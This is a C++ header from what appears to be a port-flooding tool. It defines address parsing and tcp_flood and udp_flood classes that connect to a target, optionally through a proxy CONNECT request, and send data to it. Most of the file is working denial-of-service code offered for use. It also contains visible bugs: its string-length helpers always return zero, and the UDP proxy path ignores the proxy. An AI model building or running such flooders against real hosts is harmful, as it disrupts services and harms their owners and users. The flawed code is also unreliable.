//
// Created by imper on 3/3/22.
//

#ifndef PORT_FLOODER_NETWORK_HPP
#define PORT_FLOODER_NETWORK_HPP

#include <cstdint>
#include <string>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <iostream>
#include <memory>
#include <netdb.h>

#define MAX_QUERIES 2048
#define PROXY_CONNECT "CONNECT"
#define PROXY_CONNECT_SIZE ::net::__detail__::consteval_strlen(PROXY_CONNECT)
#define ADDRESS_MAX_LEN ::net::__detail__::consteval_strlen("255.255.255.255:65535")

namespace net
{
	
	namespace __detail__ __attribute__((visibility("hidden")))
	{
		static consteval size_t consteval_strlen(const char* str)
		{
			size_t size = 0;
			for (; *str; ++str);
			return size;
		}
		
		static constexpr size_t constexpr_strlen(const char* str)
		{
			size_t size = 0;
			for (; *str; ++str);
			return size;
		}
	}
	
	
	class inet_address
	{
	public:
		inline inet_address(in_addr_t __address, in_port_t __port) : address{AF_INET, ::htons(__port), in_addr{__address}}
		{ }
		
		inline inet_address(std::string __address) : address{AF_INET}
		{
			in_port_t port = 80;
			if (__address.starts_with("ftp://"))
			{
				port = 21;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("ftp://"));
			}
			else if (__address.starts_with("ssh://"))
			{
				port = 22;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("ssh://"));
			}
			else if (__address.starts_with("telnet://"))
			{
				port = 23;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("telnet://"));
			}
			else if (__address.starts_with("smtp://"))
			{
				port = 25;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("smtp://"));
			}
			else if (__address.starts_with("dns://"))
			{
				port = 53;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("dns://"));
			}
			else if (__address.starts_with("http://"))
			{
				port = 80;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("http://"));
			}
			else if (__address.starts_with("pop3://"))
			{
				port = 110;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("pop3://"));
			}
			else if (__address.starts_with("ntp://"))
			{
				port = 123;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("ntp://"));
			}
			else if (__address.starts_with("imap://"))
			{
				port = 143;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("imap://"));
			}
			else if (__address.starts_with("snmp://"))
			{
				port = 161;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("snmp://"));
			}
			else if (__address.starts_with("https://"))
			{
				port = 443;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("https://"));
			}
			else if (__address.starts_with("rdp://"))
			{
				port = 3389;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("rdp://"));
			}
			
			auto colonpos = __address.find(':');
			if (colonpos != std::string::npos)
			{
				++colonpos;
				port = std::stoul(__address.substr(colonpos));
			}
			
			address.sin_port = ::htons(port);
			::inet_aton(__address.substr(0, colonpos - 1).c_str(), &address.sin_addr);
			if (address.sin_addr.s_addr == 0)
			{
				auto addr_list = *reinterpret_cast<in_addr**>(::gethostbyname(__address.substr(0, colonpos - 1).c_str())->h_addr_list);
				address.sin_addr = addr_list[0];
			}
		}
		
		[[nodiscard]] inline std::string get_ip() const
		{
			return {::inet_ntoa(address.sin_addr)};
		}
		
		[[nodiscard]] inline in_port_t get_port() const
		{
			return ::htons(address.sin_port);
		}
	
	private:
		friend class tcp_flood;
		
		friend class udp_flood;
		
		sockaddr_in address;
	};
	
	class tcp_flood
	{
	public:
		inline tcp_flood(const inet_address& address, const std::string& data, const inet_address* proxy, bool debug = false)
				: address(address), socket(::socket(AF_INET, SOCK_STREAM, IPPROTO_IP))
		{
			if (proxy)
			{
				if (::connect(socket, reinterpret_cast<const sockaddr*>(&proxy->address), sizeof proxy->address) < 0)
					status = false;
				
				std::string req_buf(PROXY_CONNECT " ");
				req_buf += address.get_ip();
				req_buf += ':';
				req_buf += std::to_string(address.get_port());
				req_buf += data;
				
				if (::send(socket, req_buf.c_str(), req_buf.size(), 0) < 0)
					status = false;
			}
			else
			{
				if (::connect(socket, reinterpret_cast<const sockaddr*>(&address.address), sizeof address.address) < 0)
					status = false;
				
				if (::send(socket, data.c_str(), data.size(), 0) < 0)
					status = false;
			}
			
			::sleep(1);

//			std::array<char, 128> tmp{ };
//			size_t recved;
//			if (debug)
//				std::cout << "data = R\"(";
//			for (size_t i = 0; ((recved = ::recv(socket, tmp.data(), 128, MSG_DONTWAIT) >= 0) ||
//								errno == EWOULDBLOCK || errno == EAGAIN) && i < MAX_QUERIES; ++i)
//			{
//				::usleep(1000);
//				if (debug)
//					std::cout.write(tmp.data(), std::min(recved, tmp.size()));
//			}
//			if (debug)
//				std::cout << ")\"\n";
//			std::cout.flush();
		}
		
		inline operator bool()
		{
			return status;
		}
		
		inline ~tcp_flood()
		{
			::close(socket);
		}
	
	private:
		int socket;
		bool status = true;
		inet_address address;
	};
	
	class udp_flood
	{
	public:
		inline udp_flood(const inet_address& address, const std::string& data, const inet_address* proxy, bool debug = false)
				: address(address), socket(::socket(AF_INET, SOCK_DGRAM, IPPROTO_IP))
		{
			if (proxy)
			{
				std::string req_buf(PROXY_CONNECT " ");
				req_buf += address.get_ip();
				req_buf += ':';
				req_buf += std::to_string(address.get_port());
				req_buf += data;
				
				if (::sendto(socket, req_buf.c_str(), req_buf.size(), 0, reinterpret_cast<const sockaddr*>(&address.address), sizeof address.address)
					< 0)
					status = false;
			}
			else if (::sendto(socket, data.c_str(), data.size(), 0, reinterpret_cast<const sockaddr*>(&address.address), sizeof address.address)
					 < 0)
				status = false;
			
			::sleep(1);

//			char tmp[128];
//			auto addr = address.address;
//			socklen_t len;
//			size_t recved;
//			if (debug)
//				std::cout << "data = R\"(";
//			for (size_t i = 0; ((recved = ::recvfrom(socket, tmp, 128, 0, reinterpret_cast<sockaddr*>(&addr), &len)) >= 0 ||
//								errno == EWOULDBLOCK || errno == EAGAIN) && i < MAX_QUERIES; ++i)
//			{
//				::usleep(1000);
//				if (debug)
//					std::cout.write(tmp, recved);
//			}
//			if (debug)
//				std::cout << ")\"\n";
//			std::cout.flush();
		}
		
		inline operator bool()
		{
			return status;
		}
		
		inline ~udp_flood()
		{
			::close(socket);
		}
	
	private:
		int socket;
		bool status = true;
		inet_address address;
	};
}

#endif //PORT_FLOODER_NETWORK_HPP
